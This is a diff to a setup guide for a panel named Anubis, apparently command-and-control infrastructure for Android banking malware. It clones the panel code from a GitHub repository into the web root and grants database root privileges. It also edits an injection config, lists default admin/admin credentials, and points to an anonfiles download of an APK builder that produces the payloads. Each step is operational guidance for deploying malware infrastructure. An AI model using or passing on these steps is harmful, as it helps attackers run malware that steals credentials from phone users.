@@ -17,8 +17,8 @@ GRANT ALL PRIVILEGES ON *.* TO 'anubisroot'@'localhost';
 FLUSH PRIVILEGES;
 cd /var/www
 rm -Rf html
-git clone https://github.com/CubRube/Anubisdownload
-mv Anubisdownload html
+git clone https://github.com/CubRube/anubisdownloader2.5
+mv anubisdownloader2.5 html
 chmod 700 html
 mv phpmyadmin /htmlphpmyadmin
 cd /htmlphpmyadmin
@@ -51,13 +51,13 @@ nano /var/www/html/inj/config.php
 
 localhost/ -> yoururl(ip:port)/
 __________________________________
-Panel http://yoururl(ip:port)/
+Panel http://yoururl(ip:999)/
 Login admin
 pass admin
 Settings
-Panel link-> http://yoururl(ip:port)/
-URL link-> http://yoururl(ip:port)/
-Builder http://yoururl(ip:port)/builderbot (ON WINDOWS 7-10)
+Panel link-> http://yoururl(ip:80)/ (trafic)
+URL link-> http://yoururl(ip:80)/ (trafic)
+Builder https://anonfiles.com/v195O5mazb/BatchApkToolBuilderWindows7_11_zip (ON WINDOWS 7-10)
 
 
 
